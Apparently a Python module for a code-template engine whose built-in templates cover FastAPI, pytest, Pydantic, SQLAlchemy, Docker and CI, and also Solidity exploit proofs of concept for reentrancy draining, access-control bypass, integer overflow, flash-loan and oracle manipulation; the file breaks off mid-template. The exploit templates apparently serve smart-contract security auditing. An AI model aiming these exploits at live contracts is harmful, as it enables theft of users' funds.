# ruff: noqa: BLE001
"""CodeGenome Template Engine
============================
Loads YAML code templates from $WM_STATE_ROOT/codegenome/ and built-in defaults.
Supports variable substitution, tiered variant selection, dependency tracking,
signature matching, and lineage for the Vibe Coding God-Kit.

Template format (YAML):
    name: fastapi_endpoint
    version: 1
    description: Minimal FastAPI endpoint with validation
    tier_variants:
      xianfeng: |
        @router.get("/{{path}}")
        def get_{{name}}():
            return {"ok": True}
      wei_wuzu: |
        @router.get("/{{path}}")
        def get_{{name}}():
            # TODO: add service layer
            return {"ok": True}
      huben: |
        @router.get("/{{path}}")
        async def get_{{name}}(
            db: AsyncSession = Depends(get_db),
        ):
            result = await service.get_{{name}}(db)
            return result
    default: |
        @router.get("/{{path}}")
        def get_{{name}}():
            return {"ok": True}
    variables:
      - path
      - name
    dependencies:
      - fastapi
      - sqlalchemy
    signature: "router.get -> JSONResponse"
    tags: [fastapi, endpoint, rest]
    parent_id: ""
    success_rate: 0.95

Usage:
    engine = get_codegenome_engine()
    code = engine.render("fastapi_endpoint", path="/items", name="items",
                         tier="xianfeng")
"""

from __future__ import annotations

import logging
import re
import threading
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)

try:
    import yaml

    HAS_YAML = True
except ImportError:
    HAS_YAML = False

TIER_ELEMENTS = ("xianfeng", "wei_wuzu", "huben")

# Variable pattern: {{variable_name}}
_VAR_PATTERN = re.compile(r"\{\{\s*(\w+)\s*\}\}")

# Include directive pattern: {{include:template_name,var1=val1,var2=val2}}
_INCLUDE_PATTERN = re.compile(r"\{\{include:([\w]+)(?:\s*,\s*(.+?))?\}\}")

# Project files key for multi-file templates
_PROJECT_FILES_KEY = "files"


@dataclass
class CodeTemplate:
    """A single code template with lineage tracking."""

    name: str
    description: str = ""
    version: int = 1
    default: str = ""
    tier_variants: dict[str, str] = field(default_factory=dict)
    variables: list[str] = field(default_factory=list)
    dependencies: list[str] = field(default_factory=list)
    signature: str = ""
    tags: list[str] = field(default_factory=list)
    parent_id: str = ""  # For lineage: forked-from template name
    success_rate: float = 1.0
    last_used: str = ""  # ISO-8601 timestamp
    source: str = "builtin"  # "builtin" or file path
    deprecated: bool = False  # Phase 3: auto-deprecated by feedback loop
    content_hash: str = ""  # Phase 5: SHA-256 of template content
    signature_key: str = ""  # Phase 5: Ed25519 signature of content_hash
    files: list[dict[str, Any]] = field(default_factory=list)  # Phase 2: project templates

    def render(
        self,
        tier: str | None = None,
        *,
        polymorph: bool = False,
        polymorph_seed: int | None = None,
        **kwargs: Any,
    ) -> str:
        """Render the template with variable substitution.

        Args:
            tier: Tier variant to use (xianfeng/wei_wuzu/huben)
            polymorph: If True, apply stochastic variation via PolymorphismEngine
            polymorph_seed: Optional seed for reproducible polymorphism
            **kwargs: Variable substitutions
        """
        if tier and tier in self.tier_variants:
            text = self.tier_variants[tier]
        else:
            text = self.default

        def _replace(match: Any) -> Any:
            var_name = match.group(1)
            return str(kwargs.get(var_name, f"{{{{{var_name}}}}}"))

        rendered = _VAR_PATTERN.sub(_replace, text)

        # Phase 2: Resolve include directives
        rendered = self._resolve_includes(rendered, tier=tier)

        # Phase 1: Apply polymorphism if requested
        if polymorph:
            from .polymorphism import PolymorphismEngine

            engine = PolymorphismEngine(seed=polymorph_seed)
            rendered = engine.polymorph(rendered)

        return rendered

    def _resolve_includes(self, text: str, tier: str | None = None) -> str:
        """Resolve {{include:template_name,var=val}} directives."""
        from .engine import get_codegenome_engine

        engine = get_codegenome_engine()
        # Track include chain for cycle detection
        chain = getattr(engine, "_current_include_chain", set())

        def _resolve(match: Any) -> str:
            included_name = match.group(1)
            vars_str = match.group(2) or ""

            if included_name in chain:
                return f"# ERROR: circular include detected: {included_name}"

            # Parse variables from the include directive
            include_vars: dict[str, str] = {}
            if vars_str:
                for pair in vars_str.split(","):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        include_vars[k.strip()] = v.strip()

            included_template = engine.get_template(included_name)
            if included_template is None:
                return f"# ERROR: unknown included template: {included_name}"

            # Add to chain for cycle detection
            old_chain = engine._current_include_chain if hasattr(engine, "_current_include_chain") else set()
            engine._current_include_chain = old_chain | {included_name}
            try:
                rendered = included_template.render(tier=tier, **include_vars)
            finally:
                engine._current_include_chain = old_chain

            return rendered

        # Iteratively resolve nested includes (up to 10 levels)
        for _ in range(10):
            new_text = _INCLUDE_PATTERN.sub(_resolve, text)
            if new_text == text:
                break
            text = new_text

        return text

    def fork(self, new_name: str, body_delta: str = "") -> CodeTemplate:
        """Create a child template with incremented version."""
        child = CodeTemplate(
            name=new_name,
            description=f"Forked from {self.name}: {self.description}",
            version=self.version + 1,
            default=body_delta or self.default,
            tier_variants=dict(self.tier_variants),
            variables=list(self.variables),
            dependencies=list(self.dependencies),
            signature=self.signature,
            tags=list(self.tags),
            parent_id=self.name,
            success_rate=1.0,
            source="forked",
            files=list(self.files) if self.files else [],
        )
        # Phase 5: Sign the fork
        child = _sign_template(child)
        return child

    def to_dict(self) -> dict[str, Any]:
        """
        Convert to/from dict.

        Returns:
            dict[str, Any]
        """
        return {
            "name": self.name,
            "description": self.description,
            "version": self.version,
            "variables": self.variables,
            "tier_variants": list(self.tier_variants.keys()),
            "dependencies": self.dependencies,
            "signature": self.signature,
            "tags": self.tags,
            "parent_id": self.parent_id,
            "success_rate": self.success_rate,
            "last_used": self.last_used,
            "source": self.source,
            "deprecated": self.deprecated,
            "content_hash": self.content_hash,
            "signature_key": self.signature_key,
            "is_project": bool(self.files),
        }


def _sign_template(template: CodeTemplate) -> CodeTemplate:
    """Sign a template's content hash using AuditSigner (Phase 5).

    Returns the template with content_hash and signature_key populated.
    Falls back to unsigned if AuditSigner is unavailable.
    """
    import hashlib

    content = template.default + str(sorted(template.tier_variants.items()))
    template.content_hash = hashlib.sha256(content.encode()).hexdigest()[:16]

    try:
        from whitemagic.security.audit_signing import AuditSigner

        signer = AuditSigner()
        if signer.is_available:
            sig = signer.sign(template.content_hash)
            if sig:
                template.signature_key = sig.get("signature", "")
    except Exception:
        pass  # Graceful degradation — unsigned but functional

    return template


_BUILTIN_TEMPLATES: list[CodeTemplate] = [
    CodeTemplate(
        name="fastapi_endpoint",
        description="Minimal FastAPI GET endpoint",
        version=1,
        default=(
            '@router.get("/{{path}}")\ndef get_{{name}}():\n    return {"ok": True}\n'
        ),
        tier_variants={
            "xianfeng": (
                '@router.get("/{{path}}")\n'
                "def get_{{name}}():\n"
                '    return {"ok": True}\n'
            ),
            "wei_wuzu": (
                '@router.get("/{{path}}")\n'
                "def get_{{name}}():\n"
                "    # TODO: add validation\n"
                '    return {"ok": True}\n'
            ),
            "huben": (
                '@router.get("/{{path}}")\n'
                "async def get_{{name}}(\n"
                "    db: AsyncSession = Depends(get_db),\n"
                "):\n"
                "    result = await service.get_{{name}}(db)\n"
                "    return result\n"
            ),
        },
        variables=["path", "name"],
        dependencies=["fastapi"],
        signature="router.get -> JSONResponse",
        tags=["fastapi", "endpoint", "rest"],
    ),
    CodeTemplate(
        name="pytest_fixture",
        description="Reusable pytest fixture pattern",
        version=1,
        default=(
            "@pytest.fixture\n"
            "def {{name}}_fixture():\n"
            "    instance = create_{{name}}()\n"
            "    yield instance\n"
            "    cleanup(instance)\n"
        ),
        tier_variants={
            "xianfeng": (
                "@pytest.fixture\ndef {{name}}_fixture():\n    return {{name}}()\n"
            ),
            "wei_wuzu": (
                "@pytest.fixture\n"
                "def {{name}}_fixture():\n"
                "    instance = create_{{name}}()\n"
                "    yield instance\n"
                "    cleanup(instance)\n"
            ),
            "huben": (
                '@pytest.fixture(scope="session")\n'
                "def {{name}}_fixture():\n"
                "    with create_{{name}}() as instance:\n"
                "        yield instance\n"
            ),
        },
        variables=["name"],
        dependencies=["pytest"],
        signature="fixture -> yield resource",
        tags=["pytest", "testing", "fixture"],
    ),
    CodeTemplate(
        name="pydantic_model",
        description="Pydantic base model with validation",
        version=1,
        default=('class {{name}}(BaseModel):\n    id: int\n    label: str = ""\n'),
        tier_variants={
            "xianfeng": ("class {{name}}(BaseModel):\n    id: int\n"),
            "wei_wuzu": (
                'class {{name}}(BaseModel):\n    id: int\n    label: str = ""\n'
            ),
            "huben": (
                "class {{name}}(BaseModel):\n"
                "    model_config = ConfigDict(from_attributes=True)\n\n"
                "    id: int\n"
                '    label: str = Field(default="", max_length=100)\n'
                "    created_at: datetime = Field(default_factory=utc_now)\n"
            ),
        },
        variables=["name"],
        dependencies=["pydantic"],
        signature="BaseModel subclass",
        tags=["pydantic", "model", "validation"],
    ),
    CodeTemplate(
        name="sqlalchemy_model",
        description="SQLAlchemy declarative base model",
        version=1,
        default=(
            "class {{name}}(Base):\n"
            "    __tablename__ = '{{table_name}}'\n\n"
            "    id: Mapped[int] = mapped_column(primary_key=True)\n"
        ),
        tier_variants={
            "xianfeng": (
                "class {{name}}(Base):\n"
                "    __tablename__ = '{{table_name}}'\n"
                "    id = Column(Integer, primary_key=True)\n"
            ),
            "wei_wuzu": (
                "class {{name}}(Base):\n"
                "    __tablename__ = '{{table_name}}'\n\n"
                "    id: Mapped[int] = mapped_column(primary_key=True)\n"
                "    created_at: Mapped[datetime] = mapped_column(\n"
                "        DateTime, default=datetime.utcnow\n"
                "    )\n"
            ),
            "huben": (
                "class {{name}}(Base):\n"
                "    __tablename__ = '{{table_name}}'\n\n"
                "    id: Mapped[int] = mapped_column(primary_key=True)\n"
                "    created_at: Mapped[datetime] = mapped_column(\n"
                "        DateTime, default=datetime.utcnow\n"
                "    )\n"
                "    updated_at: Mapped[datetime] = mapped_column(\n"
                "        DateTime, default=datetime.utcnow, onupdate=datetime.utcnow\n"
                "    )\n\n"
                "    def __repr__(self) -> str:\n"
                '        return f"<{{name}}(id={self.id})>"\n'
            ),
        },
        variables=["name", "table_name"],
        dependencies=["sqlalchemy"],
        signature="Base declarative model",
        tags=["sqlalchemy", "orm", "database"],
    ),
    CodeTemplate(
        name="dockerfile",
        description="Multi-stage Dockerfile",
        version=1,
        default=(
            "FROM python:3.12-slim\n\n"
            "WORKDIR /app\n"
            "COPY . .\n"
            'CMD ["python", "main.py"]\n'
        ),
        tier_variants={
            "xianfeng": (
                "FROM python:3.12-slim\n\n"
                "WORKDIR /app\n"
                "COPY . .\n"
                'CMD ["python", "main.py"]\n'
            ),
            "wei_wuzu": (
                "FROM python:3.12-slim as builder\n\n"
                "WORKDIR /app\n"
                "COPY requirements.txt .\n"
                "RUN pip install --no-cache-dir -r requirements.txt\n\n"
                "COPY . .\n"
                'CMD ["python", "main.py"]\n'
            ),
            "huben": (
                "# Build stage\n"
                "FROM python:3.12-slim as builder\n\n"
                "WORKDIR /app\n"
                "COPY requirements.txt .\n"
                "RUN pip install --user --no-cache-dir -r requirements.txt\n\n"
                "# Runtime stage\n"
                "FROM python:3.12-slim\n\n"
                "WORKDIR /app\n"
                "COPY --from=builder /root/.local /root/.local\n"
                "COPY . .\n\n"
                "ENV PATH=/root/.local/bin:$PATH\n"
                'CMD ["python", "main.py"]\n'
            ),
        },
        variables=[],
        dependencies=["docker"],
        signature="Dockerfile multi-stage",
        tags=["docker", "container", "deployment"],
    ),
    CodeTemplate(
        name="github_action",
        description="GitHub Actions CI workflow",
        version=1,
        default=(
            "name: CI\n\n"
            "on: [push, pull_request]\n\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "      - run: pytest\n"
        ),
        tier_variants={
            "xianfeng": (
                "name: CI\n\n"
                "on: [push, pull_request]\n\n"
                "jobs:\n"
                "  test:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "      - run: pytest\n"
            ),
            "wei_wuzu": (
                "name: CI\n\n"
                "on:\n"
                "  push:\n"
                "    branches: [main]\n"
                "  pull_request:\n\n"
                "jobs:\n"
                "  test:\n"
                "    runs-on: ubuntu-latest\n"
                "    strategy:\n"
                "      matrix:\n"
                "        python-version: ['3.11', '3.12']\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "      - uses: actions/setup-python@v5\n"
                "        with:\n"
                "          python-version: ${{ matrix.python-version }}\n"
                "      - run: pip install -r requirements.txt\n"
                "      - run: pytest\n"
            ),
            "huben": (
                "name: CI\n\n"
                "on:\n"
                "  push:\n"
                "    branches: [main]\n"
                "  pull_request:\n\n"
                "jobs:\n"
                "  lint:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "      - uses: actions/setup-python@v5\n"
                "        with:\n"
                "          python-version: '3.12'\n"
                "      - run: pip install ruff mypy\n"
                "      - run: ruff check .\n"
                "      - run: mypy .\n\n"
                "  test:\n"
                "    runs-on: ubuntu-latest\n"
                "    strategy:\n"
                "      matrix:\n"
                "        python-version: ['3.11', '3.12']\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "      - uses: actions/setup-python@v5\n"
                "        with:\n"
                "          python-version: ${{ matrix.python-version }}\n"
                "      - run: pip install -r requirements.txt\n"
                "      - run: pytest --cov=src --cov-report=xml\n"
                "      - uses: codecov/codecov-action@v3\n"
            ),
        },
        variables=[],
        dependencies=["github-actions"],
        signature=".github/workflows/ci.yml",
        tags=["github", "ci", "workflow", "devops"],
    ),
    CodeTemplate(
        name="poc_reentrancy",
        description="Reentrancy exploit proof-of-concept for withdrawal functions",
        version=1,
        default=(
            "// SPDX-License-Identifier: MIT\n"
            "pragma solidity ^0.8.0;\n\n"
            "interface ITarget {\n"
            "    function {{withdraw_function}}(uint256 amount) external;\n"
            "}\n\n"
            "contract ReentrancyPoC {\n"
            "    ITarget target;\n\n"
            "    constructor(address _target) {\n"
            "        target = ITarget(_target);\n"
            "    }\n\n"
            "    function attack() external {\n"
            "        target.{{withdraw_function}}(address(target).balance);\n"
            "    }\n\n"
            "    receive() external payable {\n"
            "        if (address(target).balance > 0) {\n"
            "            target.{{withdraw_function}}(address(target).balance);\n"
            "        }\n"
            "    }\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "interface ITarget {\n"
                "    function {{withdraw_function}}(uint256 amount) external;\n"
                "}\n\n"
                "contract ReentrancyPoC {\n"
                "    ITarget target;\n"
                "    constructor(address _target) { target = ITarget(_target); }\n"
                "    function attack() external {\n"
                "        target.{{withdraw_function}}(address(target).balance);\n"
                "    }\n"
                "    receive() external payable {\n"
                "        if (address(target).balance > 0) {\n"
                "            target.{{withdraw_function}}(address(target).balance);\n"
                "        }\n"
                "    }\n"
                "}\n"
            ),
            "wei_wuzu": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface ITarget {\n"
                "    function {{withdraw_function}}(uint256 amount) external;\n"
                "    function deposit() external payable;\n"
                "}\n\n"
                "contract ReentrancyPoC is Test {\n"
                "    ITarget target;\n"
                "    uint256 attackAmount = 1 ether;\n\n"
                "    constructor(address _target) { target = ITarget(_target); }\n\n"
                "    function attack() external {\n"
                "        target.deposit{value: attackAmount}();\n"
                "        target.{{withdraw_function}}(attackAmount);\n"
                "        assertEq(address(this).balance, attackAmount * 2, \"PoC failed: reentrancy did not drain funds\");\n"
                "    }\n\n"
                "    receive() external payable {\n"
                "        uint256 targetBal = address(target).balance;\n"
                "        if (targetBal > 0) {\n"
                "            target.{{withdraw_function}}(targetBal);\n"
                "        }\n"
                "    }\n"
                "}\n"
            ),
            "huben": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface ITarget {\n"
                "    function {{withdraw_function}}(uint256 amount) external;\n"
                "    function deposit() external payable;\n"
                "    function balances(address) external view returns (uint256);\n"
                "}\n\n"
                "contract ReentrancyPoC is Test {\n"
                "    ITarget target;\n"
                "    uint256 attackAmount = 1 ether;\n"
                "    uint256 reentryCount;\n\n"
                "    constructor(address _target) { target = ITarget(_target); }\n\n"
                "    /// @notice Exploit reentrancy in {{withdraw_function}}\n"
                "    /// @dev The target updates state AFTER the external call,\n"
                "    ///      allowing our receive() to re-enter and drain funds.\n"
                "    /// @impact All funds in the contract can be stolen.\n"
                "    function attack() external {\n"
                "        // Step 1: Deposit to establish a balance\n"
                "        target.deposit{value: attackAmount}();\n"
                "        uint256 initialTargetBalance = address(target).balance;\n\n"
                "        // Step 2: Trigger withdraw — our receive() will re-enter\n"
                "        target.{{withdraw_function}}(attackAmount);\n\n"
                "        // Step 3: Verify exploit success\n"
                "        assertGt(address(this).balance, attackAmount, \"PoC failed: no extra funds drained\");\n"
                "        assertLt(address(target).balance, initialTargetBalance, \"PoC failed: target balance unchanged\");\n\n"
                "        emit log_named_uint(\"Reentry count\", reentryCount);\n"
                "        emit log_named_uint(\"Funds drained\", address(this).balance);\n"
                "    }\n\n"
                "    receive() external payable {\n"
                "        reentryCount++;\n"
                "        uint256 targetBal = address(target).balance;\n"
                "        if (targetBal > 0) {\n"
                "            target.{{withdraw_function}}(targetBal);\n"
                "        }\n"
                "    }\n"
                "}\n"
            ),
        },
        variables=["withdraw_function"],
        dependencies=["forge-std/Test.sol"],
        signature="contract ReentrancyPoC",
        tags=["poc", "reentrancy", "exploit", "web3", "security"],
    ),
    CodeTemplate(
        name="poc_access_bypass",
        description="Access control bypass proof-of-concept for unprotected functions",
        version=1,
        default=(
            "// SPDX-License-Identifier: MIT\n"
            "pragma solidity ^0.8.0;\n\n"
            "import \"forge-std/Test.sol\";\n\n"
            "interface ITarget {\n"
            "    function {{function_name}}({{function_args}}) external;\n"
            "}\n\n"
            "contract AccessBypassPoC is Test {\n"
            "    ITarget target;\n\n"
            "    function setUp() public {\n"
            "        target = ITarget(address({{target_address}}));\n"
            "    }\n\n"
            "    function test_access_bypass() public {\n"
            "        // Call the unprotected function as any user\n"
            "        target.{{function_name}}({{function_args}});\n"
            "        assertTrue(true, \"PoC executed: unprotected function called by unauthorized user\");\n"
            "    }\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "interface ITarget {\n"
                "    function {{function_name}}({{function_args}}) external;\n"
                "}\n\n"
                "contract AccessBypassPoC {\n"
                "    function attack(address targetAddr) external {\n"
                "        ITarget(targetAddr).{{function_name}}({{function_args}});\n"
                "    }\n"
                "}\n"
            ),
            "wei_wuzu": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface ITarget {\n"
                "    function {{function_name}}({{function_args}}) external;\n"
                "}\n\n"
                "contract AccessBypassPoC is Test {\n"
                "    ITarget target;\n\n"
                "    function setUp() public {\n"
                "        target = ITarget(address({{target_address}}));\n"
                "    }\n\n"
                "    function test_unauthorized_call() public {\n"
                "        // Any address can call this function — no access control\n"
                "        target.{{function_name}}({{function_args}});\n"
                "        assertTrue(true, \"Access bypass confirmed: no auth check\");\n"
                "    }\n"
                "}\n"
            ),
            "huben": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface ITarget {\n"
                "    function {{function_name}}({{function_args}}) external;\n"
                "    function owner() external view returns (address);\n"
                "}\n\n"
                "contract AccessBypassPoC is Test {\n"
                "    ITarget target;\n"
                "    address attacker = address(0xBEEF);\n\n"
                "    function setUp() public {\n"
                "        target = ITarget(address({{target_address}}));\n"
                "    }\n\n"
                "    /// @notice Demonstrate access control bypass on {{function_name}}\n"
                "    /// @dev The function lacks onlyOwner/onlyRole modifier,\n"
                "    ///      allowing any user to call it.\n"
                "    /// @impact Unauthorized privilege escalation.\n"
                "    function test_access_bypass() public {\n"
                "        // Verify we are NOT the owner\n"
                "        address currentOwner = target.owner();\n"
                "        assertNotEq(address(this), currentOwner, \"Setup error: attacker is owner\");\n\n"
                "        // Prank as a random attacker\n"
                "        vm.prank(attacker);\n"
                "        target.{{function_name}}({{function_args}});\n\n"
                "        // If we reach here, the function has no access control\n"
                "        emit log(\"Access bypass confirmed: unauthorized user called {{function_name}}\");\n"
                "    }\n"
                "}\n"
            ),
        },
        variables=["function_name", "function_args", "target_address"],
        dependencies=["forge-std/Test.sol"],
        signature="contract AccessBypassPoC",
        tags=["poc", "access-control", "exploit", "web3", "security"],
    ),
    CodeTemplate(
        name="poc_integer_overflow",
        description="Integer overflow/underflow proof-of-concept for pre-0.8.0 arithmetic",
        version=1,
        default=(
            "// SPDX-License-Identifier: MIT\n"
            "pragma solidity ^0.8.0;\n\n"
            "import \"forge-std/Test.sol\";\n\n"
            "interface ITarget {\n"
            "    function {{function_name}}(uint256 amount) external;\n"
            "}\n\n"
            "contract IntegerOverflowPoC is Test {\n"
                "    ITarget target;\n\n"
                "    function setUp() public {\n"
                "        target = ITarget(address({{target_address}}));\n"
                "    }\n\n"
                "    function test_overflow() public {\n"
                "        // Trigger overflow with max uint256 + 1\n"
                "        uint256 maxUint = type(uint256).max;\n"
                "        target.{{function_name}}(maxUint);\n"
                "        target.{{function_name}}(1);\n"
                "        assertTrue(true, \"Overflow triggered — check state for zero/wrapped value\");\n"
                "    }\n"
                "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "// SPDX-License-Identifier: MIT\n"
                "// Target must be compiled with solidity <0.8.0 for overflow to occur\n"
                "pragma solidity ^0.8.0;\n\n"
                "interface ITarget {\n"
                "    function {{function_name}}(uint256 amount) external;\n"
                "}\n\n"
                "contract IntegerOverflowPoC {\n"
                "    function attack(address targetAddr) external {\n"
                "        ITarget(targetAddr).{{function_name}}(type(uint256).max);\n"
                "        ITarget(targetAddr).{{function_name}}(1);\n"
                "    }\n"
                "}\n"
            ),
            "wei_wuzu": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface ITarget {\n"
                "    function {{function_name}}(uint256 amount) external;\n"
                "    function balances(address) external view returns (uint256);\n"
                "}\n\n"
                "contract IntegerOverflowPoC is Test {\n"
                "    ITarget target;\n"
                "    address victim = address(0xVICTIM);\n\n"
                "    function setUp() public {\n"
                "        target = ITarget(address({{target_address}}));\n"
                "    }\n\n"
                "    function test_overflow_underflow() public {\n"
                "        // Overflow: max + 1 = 0 (in pre-0.8.0)\n"
                "        target.{{function_name}}(type(uint256).max);\n"
                "        target.{{function_name}}(1);\n\n"
                "        // Underflow: 0 - 1 = max (in pre-0.8.0)\n"
                "        // Check if balance wrapped to max uint256\n"
                "        uint256 bal = target.balances(victim);\n"
                "        assertGt(bal, type(uint128).max, \"Overflow/underflow did not occur\");\n"
                "    }\n"
                "}\n"
            ),
            "huben": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface ITarget {\n"
                "    function {{function_name}}(uint256 amount) external;\n"
                "    function balances(address) external view returns (uint256);\n"
                "    function totalSupply() external view returns (uint256);\n"
                "}\n\n"
                "contract IntegerOverflowPoC is Test {\n"
                "    ITarget target;\n"
                "    address attacker = address(0xBEEF);\n\n"
                "    function setUp() public {\n"
                "        target = ITarget(address({{target_address}}));\n"
                "    }\n\n"
                "    /// @notice Exploit integer overflow in {{function_name}}\n"
                "    /// @dev Target compiled with Solidity <0.8.0 lacks built-in overflow checks.\n"
                "    ///      By adding max uint256 + 1, the value wraps to 0,\n"
                "    ///      potentially minting tokens or bypassing balance checks.\n"
                "    /// @impact Token minting, balance manipulation, totalSupply corruption.\n"
                "    function test_integer_overflow() public {\n"
                "        uint256 supplyBefore = target.totalSupply();\n\n"
                "        // Trigger overflow\n"
                "        vm.prank(attacker);\n"
                "        target.{{function_name}}(type(uint256).max);\n"
                "        vm.prank(attacker);\n"
                "        target.{{function_name}}(1);\n\n"
                "        uint256 supplyAfter = target.totalSupply();\n"
                "        uint256 attackerBal = target.balances(attacker);\n\n"
                "        // If overflow occurred, supply or balance should be abnormal\n"
                "        assertNotEq(supplyBefore, supplyAfter, \"No state change — overflow may not apply\");\n"
                "        emit log_named_uint(\"Supply before\", supplyBefore);\n"
                "        emit log_named_uint(\"Supply after\", supplyAfter);\n"
                "        emit log_named_uint(\"Attacker balance\", attackerBal);\n"
                "    }\n"
                "}\n"
            ),
        },
        variables=["function_name", "target_address"],
        dependencies=["forge-std/Test.sol"],
        signature="contract IntegerOverflowPoC",
        tags=["poc", "integer-overflow", "exploit", "web3", "security"],
    ),
    CodeTemplate(
        name="poc_flash_loan",
        description="Flash loan attack PoC — borrow large amount, manipulate price, repay",
        version=1,
        default=(
            "// SPDX-License-Identifier: MIT\n"
            "pragma solidity ^0.8.0;\n\n"
            "interface IFlashLoanProvider {\n"
            "    function flashLoan(address target, bytes calldata data) external;\n"
            "}\n"
            "interface ITarget {\n"
            "    function {{price_function}}() external view returns (uint256);\n"
            "    function {{exploit_function}}(uint256 amount) external;\n"
            "}\n\n"
            "contract FlashLoanPoC {\n"
            "    ITarget target;\n"
            "    IFlashLoanProvider provider;\n\n"
            "    constructor(address _target, address _provider) {\n"
            "        target = ITarget(_target);\n"
            "        provider = IFlashLoanProvider(_provider);\n"
            "    }\n\n"
            "    function attack() external {\n"
            "        bytes memory data = abi.encodeWithSelector(this._execute.selector);\n"
            "        provider.flashLoan(address(this), data);\n"
            "    }\n\n"
            "    function _execute() external {\n"
            "        target.{{exploit_function}}(address(this).balance);\n"
            "    }\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "interface ITarget { function {{exploit_function}}(uint256) external; }\n\n"
                "contract FlashLoanPoC {\n"
                "    ITarget target;\n"
                "    constructor(address _t) { target = ITarget(_t); }\n"
                "    function attack() external { target.{{exploit_function}}(type(uint256).max); }\n"
                "}\n"
            ),
            "huben": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface ITarget {\n"
                "    function {{price_function}}() external view returns (uint256);\n"
                "    function {{exploit_function}}(uint256 amount) external;\n"
                "}\n\n"
                "contract FlashLoanPoC is Test {\n"
                "    ITarget target;\n"
                "    uint256 flashAmount = 10000 ether;\n\n"
                "    constructor(address _target) { target = ITarget(_target); }\n\n"
                "    /// @notice Flash loan attack on {{exploit_function}}\n"
                "    /// @dev Borrow large amount → manipulate price via {{price_function}} → exploit → repay\n"
                "    /// @impact Price manipulation can drain protocol reserves\n"
                "    function attack() external {\n"
                "        uint256 priceBefore = target.{{price_function}}();\n"
                "        // Simulate flash loan: large borrow to manipulate reserves\n"
                "        target.{{exploit_function}}(flashAmount);\n"
                "        uint256 priceAfter = target.{{price_function}}();\n"
                "        assertNotEq(priceBefore, priceAfter, \"Price unchanged — flash loan may not apply\");\n"
                "        emit log_named_uint(\"Price before\", priceBefore);\n"
                "        emit log_named_uint(\"Price after\", priceAfter);\n"
                "    }\n"
                "}\n"
            ),
        },
        variables=["price_function", "exploit_function"],
        dependencies=["forge-std/Test.sol"],
        signature="contract FlashLoanPoC",
        tags=["poc", "flash-loan", "exploit", "web3", "security"],
    ),
    CodeTemplate(
        name="poc_oracle_manipulation",
        description="Oracle manipulation PoC — exploit spot price reliance",
        version=1,
        default=(
            "// SPDX-License-Identifier: MIT\n"
            "pragma solidity ^0.8.0;\n\n"
            "interface ITarget {\n"
            "    function getPrice() external view returns (uint256);\n"
            "    function {{trade_function}}(uint256 amount) external;\n"
            "}\n\n"
            "contract OracleManipulationPoC {\n"
            "    ITarget target;\n"
            "    constructor(address _t) { target = ITarget(_t); }\n"
            "    function attack() external {\n"
            "        uint256 manipulatedPrice = target.getPrice();\n"
            "        target.{{trade_function}}(manipulatedPrice);\n"
            "    }\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "interface ITarget { function {{trade_function}}(uint256) external; }\n\n"
                "contract OracleManipulationPoC {\n"
                "    ITarget target;\n"
                "    constructor(address _t) { target = ITarget(_t); }\n"
                "    function attack() external { target.{{trade_function}}(type(uint256).max); }\n"
                "}\n"
            ),
            "huben": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface ITarget {\n"
                "    function getPrice() external view returns (uint256);\n"
                "    function {{trade_function}}(uint256 amount) external;\n"
                "}\n\n"
                "contract OracleManipulationPoC is Test {\n"
                "    ITarget target;\n"
                "    constructor(address _t) { target = ITarget(_t); }\n\n"
                "    /// @notice Oracle manipulation via spot price in {{trade_function}}\n"
                "    /// @dev Target uses getReserves() directly — manipulable via large swap\n"
                "    /// @impact Incorrect pricing leads to profitable arbitrage or fund drain\n"
                "    function attack() external {\n"
                "        uint256 priceBefore = target.getPrice();\n"
                "        // Large trade to manipulate reserves\n"
                "        target.{{trade_function}}(1000 ether);\n"
                "        uint256 priceAfter = target.getPrice();\n"
                "        assertNotEq(priceBefore, priceAfter, \"Price not manipulable\");\n"
                "        emit log_named_uint(\"Price before\", priceBefore);\n"
                "        emit log_named_uint(\"Price after\", priceAfter);\n"
                "    }\n"
                "}\n"
            ),
        },
        variables=["trade_function"],
        dependencies=["forge-std/Test.sol"],
        signature="contract OracleManipulationPoC",
        tags=["poc", "oracle-manipulation", "exploit", "web3", "security"],
    ),
    CodeTemplate(
        name="poc_storage_collision",
        description="Storage collision PoC — proxy delegatecall storage mismatch",
        version=1,
        default=(
